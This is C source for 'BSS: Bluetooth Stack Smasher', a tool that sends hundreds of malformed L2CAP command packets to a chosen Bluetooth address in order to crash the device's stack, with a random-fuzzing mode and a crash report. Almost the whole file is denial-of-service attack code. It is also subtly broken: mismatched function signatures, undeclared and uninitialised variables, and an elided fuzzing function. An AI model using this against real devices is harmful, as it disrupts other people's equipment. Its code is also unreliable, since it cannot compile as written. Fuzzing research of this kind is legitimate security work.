/*
 * BSS: Bluetooth Stack Smasher
 * This tool intends to perform several tests on the L2CAP layer 
 * of the bluetooth protocol.
 *
 * Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * You may need to install the libbluetooth (-dev) first. 
 * Debian : apt-get install libbluetooth1-dev
 *
 * Copyright (C) 2006 Pierre BETOUIN
 * 
 * Written 2006 by Pierre BETOUIN <pierre.betouin@security-labs.org>
 * 
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License version 2 as
 * published by the Free Software Foundation;
 * 
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT OF THIRD PARTY
 * RIGHTS.  IN NO EVENT SHALL THE COPYRIGHT HOLDER(S) AND AUTHOR(S) BE LIABLE
 * FOR ANY CLAIM, OR ANY SPECIAL INDIRECT OR CONSEQUENTIAL DAMAGES, OR ANY
 * DAMAGES WHATSOEVER RESULTING FROM LOSS OF USE, DATA OR PROFITS, WHETHER IN
 * AN ACTION OF CONTRACT, NEGLIGENCE OR OTHER TORTIOUS ACTION, ARISING OUT OF
 * OR IN CONNECTION WITH THE USE OR PERFORMANCE OF THIS SOFTWARE.
 * 
 * ALL LIABILITY, INCLUDING LIABILITY FOR INFRINGEMENT OF ANY PATENTS,
 * COPYRIGHTS, TRADEMARKS OR OTHER RIGHTS, RELATING TO USE OF THIS SOFTWARE
 * IS DISCLAIMED.
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>
#include <bluetooth/l2cap.h>
#include <asm/byteorder.h>

#define MAXSIZE		4096
#define IT		512
#define LENGTH		20
#define	BUFCODE		100

int usage(char *);
void l2dos(char *, int, int, char);
void l2fuzz(char *bdstr_addr, int maxsize, int maxcrash);
char *code2define(int code);

void l2dos(char *bdstr_addr, int packetSize, char fillByte, char *packetBuffer) {
	char *buf;
	l2cap_cmd_hdr *cmd;		/* struct detailed in /usr/include/bluetooth/l2cap.h */
	struct sockaddr_l2 addr;
	int sock, i, id;
	char *strcode = NULL;
	
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}

	memset(&addr, 0, sizeof(addr));
	addr.l2_family = AF_BLUETOOTH;
	if (bind(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("bind");
		exit(EXIT_FAILURE);
	}

	str2ba(bdstr_addr, &addr.l2_bdaddr);
	if (connect(sock, (struct sockaddr *) &addr, sizeof(addr)) < 0) {
		perror("connect");
		exit(EXIT_FAILURE);
	}

	if(!(buf = (char *) malloc ((int) packetSize))) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}

	for(i = L2CAP_CMD_HDR_SIZE; i < packetSize; i++) {
		if( fillByte == 0 )
			buf[i] = 0x41;		/* Default padding byte */
		else
			buf[i] = fillByte;
	}
	
	fprintf(stdout, "size = %d\n", packetSize);
	strcode = code2define(cmdnum);
	if(strcode == NULL) {
		perror("L2CAP command unknown");
		exit(EXIT_FAILURE);
	}
	else
		fprintf(stdout, "Performing \"%s\" fuzzing...\n", strcode);

	for(i = 0; i < IT; i++) {			// Send IT times the packet thru the air
		cmd = (l2cap_cmd_hdr *) buf;
		cmd->code = cmdnum;
		cmd->ident = (i%250) + 1;		// Identificator 
		cmd->len = __cpu_to_le16(LENGTH);

		putchar('.');
		fflush(stdout);
		
		if(send(sock, buf, packetSize ? packetSize : MAXSIZE, 0) <= 0) {
			fprintf(stdout, "\n%s BT stack may have crashed. This device seems to be vulnerable to buggy %s packets.\n", bdstr_addr, strcode);
			fprintf(stdout, "Please, ensure that the device has really crashed doing a bt scan for instance.\n");
			fprintf(stdout, "\t ----------------------------------------------------\n");
			fprintf(stdout, "\t Host\t\t%s\n", bdstr_addr);
			fprintf(stdout, "\t Code field\t%s\n", strcode);
			fprintf(stdout, "\t Ident field\t%d\n", id);
			fprintf(stdout, "\t Length field\t%d\n", __cpu_to_le16(LENGTH));
			fprintf(stdout, "\t Packet size\t%d\n", packetSize);
			fprintf(stdout, "\t ----------------------------------------------------\n");
		}
		if(++id > 254)
			id = 1;
	}

	free(strcode);
}

void l2fuzz(char *bdstr_addr, int max_data_size, int max_crash_count)
{
	char *data_buffer, *saved_data_buffer;
	struct sockaddr_l2 addr;
	int data_size;
	int crash_count=0, saved_data_size;
	if ((sock = socket(PF_BLUETOOTH, SOCK_RAW, BTPROTO_L2CAP)) < 0) {
		perror("socket");
		exit(EXIT_FAILURE);
	}
	
	...
}

int usage(char *programName)
{
	fprintf(stderr, "BSS: Bluetooth Stack Smasher\n");
	fprintf(stderr, "Usage: %s [-s size] [-m mode] [-p pad_byte] [-M maxcrash_count] <bdaddr>\n", programName);
	fprintf(stderr, "Modes are :\n	\
			0  ALL MODES LISTED BELOW\n	\
			1  L2CAP_COMMAND_REJ\n	\
			2  L2CAP_CONN_REQ\n	\
			3  L2CAP_CONN_RSP\n	\
			4  L2CAP_CONF_REQ\n	\
			5  L2CAP_CONF_RSP\n	\
			6  L2CAP_DISCONN_REQ\n	\
			7  L2CAP_DISCONN_RSP\n	\
			8  L2CAP_ECHO_REQ\n	\
			9  L2CAP_ECHO_RSP\n	\
			10 L2CAP_INFO_REQ\n	\
			11 L2CAP_INFO_RSP\n	\
			12 L2CAP Random Fuzzing (-s : max_size) (-M crashcount)\n\n");
	exit(EXIT_FAILURE);
}


char *code2define(int code)
{
    char *message = malloc(BUFCODE + 1);
    switch(code)
    {
        case L2CAP_ECHO_REQ:
            strcpy(message, "L2CAP echo request");
            break;
            
        case L2CAP_COMMAND_REJ:
            strcpy(message, "L2CAP command reject");
            break;
            
        case L2CAP_CONN_REQ:
            strcpy(message, "L2CAP connection request");
            break;
            
        case L2CAP_CONN_RSP:
            strcpy(message, "L2CAP connexion response");
            break;
            
        case L2CAP_CONF_REQ:
            strcpy(message, "L2CAP configuration request");
            break;
            
        case L2CAP_CONF_RSP:
            strcpy(message, "L2CAP configuration response");
            break;
            
        case L2CAP_DISCONN_REQ:
            strcpy(message, "L2CAP disconnection request");
            break;
            
        case L2CAP_DISCONN_RSP:
            strcpy(message, "L2CAP disconnection response");
            break;
            
        case L2CAP_ECHO_RSP:
            strcpy(message, "L2CAP echo response");
            break;
            
        case L2CAP_INFO_REQ:
            strcpy(message, "L2CAP info request");
            break;
            
        case L2CAP_INFO_RSP:
            strcpy(message, "L2CAP info response");
            break;
            
        default:
            message = NULL;
    }
    return message;
}

int main(int argc, char **argv)
{
	int i, packetSize = 0, attackMode = 0, maxCrashCount = 1;
	char bluetoothDeviceAddress[20], paddingCharacter = 0;

	if(getuid() != 0)
	{
		fprintf(stderr, "You need to be root to launch %s (raw socket)\n", argv[0]);
		exit(EXIT_FAILURE);
	}
	
	if(argc < 2 || argc > 9)
	{
		usage(argv[0]);
	}
	
	for(i = 0; i < argc; i++){
		if(strchr(argv[i], ':'))
			strncpy(bluetoothDeviceAddress, argv[i], 18);
		else
		{
		if(!memcmp(argv[i], "-s", 2) && (packetSize = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-m", 2) && (attackMode = atoi(argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-p", 2) && (paddingCharacter = (*argv[++i])) < 0)
			usage(argv[0]);
		
		if(!memcmp(argv[i], "-M", 2) && (maxCrashCount = atoi(argv[++i])) < 0)
			usage(argv[0]);

		}
	}

	if(attackMode > 12)
	{
		usage(argv[0]);
		exit(EXIT_FAILURE);
	}

	if(attackMode == 0)
	{
		for(i=1; i <= 0x0b; i++)
			l2dos(bluetoothDeviceAddress, i, packetSize?packetSize:MAXSIZE, paddingCharacter);
		l2fuzz(bluetoothDeviceAddress, packetSize?packetSize:MAXSIZE, maxCrashCount);
	}
	else
	{
		if(attackMode <= 11)
			l2dos(bluetoothDeviceAddress, attackMode, packetSize?packetSize:MAXSIZE, paddingCharacter);
		if(attackMode == 12)
			l2fuzz(bluetoothDeviceAddress, packetSize?packetSize:MAXSIZE, maxCrashCount);
	}
	fprintf(stdout, "\nYour bluetooth device didn't crash receiving the packets\n");
	
	return EXIT_SUCCESS;
}
